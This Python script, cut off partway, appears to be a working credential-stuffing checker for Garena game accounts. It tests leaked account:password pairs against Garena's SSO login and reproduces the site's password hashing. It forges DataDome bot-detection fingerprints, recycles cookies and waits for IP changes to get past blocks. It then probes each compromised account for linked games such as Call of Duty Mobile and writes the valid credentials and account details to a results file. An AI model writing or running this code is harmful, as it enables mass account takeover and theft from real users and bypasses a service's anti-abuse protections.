import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

colorama.init(autoreset=True)

console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
                    
            if formatted_cookie not in existing_cookies:
                with open('fresh_cookie.txt', 'a') as f:
                    f.write(formatted_cookie + '\n')
                return True
            return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def get_current_ip(self):
        ip_services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:  
                        return ip
            except Exception:
                continue
        
        logger.warning(f"[WARNING] Could not fetch IP from any service")
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
        
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
            time.sleep(10)
            return True
            
        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < max_wait_time:
            attempts += 1
            current_ip = self.get_current_ip()
            
            if current_ip and current_ip != original_ip:
                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
                return True
            else:
                if attempts % 5 == 0:  
                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
                time.sleep(check_interval)
        
        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
        return False

    def handle_403(self, session):
        self._403_attempts += 1
        
        if self._403_attempts >= 3:
            logger.error(f"[ERROR] IP blocked after 3 attempts.")
            logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
            
            if self.wait_for_ip_change(session):
                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                
                self._403_attempts = 0
                
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
                    return True
                else:
                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
                    return False
            else:
                logger.error(f"[ERROR] IP did not change, cannot continue")
                return False
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.lock = threading.Lock()
        
    def update_stats(self, valid=False, clean=False, has_codm=False):
        with self.lock:
            if valid:
                self.valid_count += 1
            else:
                self.invalid_count += 1
            if clean:
                self.clean_count += 1
            else:
                self.not_clean_count += 1
            if has_codm:
                self.has_codm_count += 1
            else:
                if valid:
                    self.no_codm_count += 1
                
    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count
            }
            
    def display_stats(self):
        stats = self.get_stats()
        bright_blue = '\033[94m'
        reset_color = '\033[0m'
        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @LEGITYAMI{reset_color}"

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
            
            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
            
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:
                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                
                if new_cookies and attempt < retries - 1:
                    logger.info(f"[RETRY] Got new cookies from 403, retrying...")
                    time.sleep(2)
                    continue
                
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                    return None, None, new_datadome
                
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            
            if 'error' in data:
                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                return None, None, new_datadome
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                return None, None, new_datadome
                
            logger.info(f"[SUCCESS] Prelogin successful: {account}")
            
            return v1, v2, new_datadome
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
                    
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    if new_cookies and attempt < retries - 1:
                        logger.info(f"[RETRY] Retrying with new cookies from 403...")
                        time.sleep(2)
                        continue
                    
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    else:
                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
                        return None, None, new_cookies.get('datadome')
                        
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return None, None, new_cookies.get('datadome')
                else:
                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            else:
                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:
            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
    
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            
            login_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in login_cookies:
                        login_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in login_cookies.items():
                if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"[WARNING] Captcha required for {account}")
                    time.sleep(3)
                    continue
                    
            return sso_key
            
        except requests.RequestException as e:
            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
            if attempt < retries - 1:
                time.sleep(2)
                
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
        
        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        return token_data.get("access_token", "")
    except Exception as e:
        logger.error(f"[ERROR] Error getting CODM access token: {e}")
        return ""

def process_codm_callback(session, access_token):
    try:
        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
        
        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")
        
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        else:
            return None, "unknown_error"
            
    except Exception as e:
        logger.error(f"[ERROR] Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
        check_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br, zstd",
            "cache-control": "no-cache",
            "codm-delete-token": token,
            "origin": "https://delete-request.codm.garena.co.id",
            "pragma": "no-cache",
            "referer": "https://delete-request.codm.garena.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v=\"24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def display_codm_info(account, codm_info):
    if not codm_info:
        return ""
    
    display_text = f" | CODM: {codm_info.get('codm_nickname', 'N/A')} (Level {codm_info.get('codm_level', 'N/A')})"
    
    region = codm_info.get('region', '')
    if region and region != 'N/A':
        display_text += f" [{region.upper()}]"
    
    return display_text

def save_codm_account(account, password, codm_info):
    if not codm_info:
        return
    
    try:
        if not os.path.exists('Results'):
            os.makedirs('Results')
            
        with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"{account}:{password} | ")
            f.write(f"Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
            f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
            f.write(f"Region: {codm_info.get('region', 'N/A')} | ")
            f.write(f"UID: {codm_info.get('uid', 'N/A')}\n")
            
        logger.info(f"💾 Saved CODM account: {account}")
    except Exception as e:
        logger.error(f"❌ Error saving CODM account {account}: {e}")

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    
    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:
        logger.info(f"[INFO] CHECKING GAME CONNECTIONS...")
        
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        
        try:
            token_data = token_response.json()
            access_token = token_data.get("access_token", "")
        except json.JSONDecodeError:
            logger.error(f"[ERROR] Invalid JSON response from token grant for {account}")
            return ["No game connections found"]
        
        if not access_token:
            logger.warning(f"[WARNING] No access token for {account}")
            return ["No game connections found"]

        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
